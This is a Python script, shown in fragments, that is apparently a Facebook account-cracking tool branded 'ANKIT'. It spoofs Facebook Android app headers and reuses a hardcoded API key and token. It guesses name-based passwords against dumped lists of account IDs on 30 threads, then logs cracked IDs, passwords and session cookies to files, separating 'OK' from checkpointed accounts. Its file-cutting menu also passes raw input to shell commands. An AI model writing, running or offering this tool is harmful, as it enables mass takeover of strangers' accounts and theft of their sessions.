#!/usr/bin/python
#Original written By CZY SAMEER 
...
from concurrent.futures import ThreadPoolExecutor as sarfrazANKIT
from string import * 
...
def randBuildLSB():
    ...
    END = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; V2027 Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})[FBAN/FB4A;FBAV/45.0.0.{str(random.randint(1000,9000))};FBBV/{str(random.randint(100000,900000))} '
    ua = '[FBAN/FB4A;FBBV/158425850;FBDM/'+'{density=3.0,width=1080,height=1920}'+';FBLC/en_US;FBRV/159951317;FB_FW/2;FBCR/Telstra;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900I;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]' +END
    return ua
...
sys.stdout.write('\x1b]2; ANKIT\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo =                                          """            
     ...
     ___      .__   __.  __  ___  __  .___________.
    /   \     |  \ |  | |  |/  / |  | |           |
   /  ^  \    |   \|  | |  '  /  |  | `---|  |----`
  /  /_\  \   |  . `  | |    <   |  |     |  |     
 /  _____  \  |  |\   | |  .  \  |  |     |  |     
...
\033[1;37m   
\033[1;37m------------------------------------------------
\033[1;37m Owner   :      ANKIT 
\033[1;37m Facebook:      Aŋ ĸɩt 󱢏
\033[1;37m STATUS :       FREE / PAID
\033[1;37m Version :      ON TESTING
\033[1;37m COUNTRY:       NEPAL
\033[1;37m STYLE  :       SIUUUU
\033[1;37m TIME   :       SEE YOUR STATUS BAR💥
\033[1;37m HOME :         NEPAL "KATHMANDU
\033[1;37m STYLE :        SAKDAINA NI FERII
...
def sarfraz():   
    os.system('clear')
    print(logo)
    print(f'[1] FILE CRACK GAR ')
    print(f'[2] Update Ma Xa')
    print(f'[3] Update Ma Xa')
    ...
    if select =='1':
        ...
        exit(' Update ma xa vandai xu tww... ')
    elif select =='3':
        random_number()
    elif select =='4':
       menu()
       ...
       cutter()
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=100085465607076/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        ANKIT(allkey)
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent':'[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957647;FBDM/{density=2.0,width=720,height=1406};FBLC/ru_RU;FBRV/334763932;FBCR/MTS RUS;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1906;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]',
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ANKITb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ANKITb};{ckkk}"
                    print(f"\r{R} [ANKIT-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ANKIT_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ANKIT_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [ANKIT-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/ANKIT_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ANKIT] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [ANKIT-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/GN_DADA_OK_IDSM2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ANKIT_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [ANKIT-CP] {sid} | {ps} {S}")
                    cps.append(sid)
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[ANKIT] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [ANKIT-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ANKIT_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazANKIT(max_workers=30) as ANKITworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                ANKITworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                ANKITworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                ANKITworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                ANKITworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/ANKIT.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/ANKIT.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    ANKIT = input('Put File Name :')
    print(" ")
    sarfraz = input('Saving Put File Name :')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+ANKIT+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + ANKIT )
    print(47*'-')
    print("File Saved To :" + sarfraz )
    print(47*'-')
    input(f"{S} Press Enter To Back ANKIT Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/ANKIT.txt\n') 
        filepath = input("Put File Name: ")
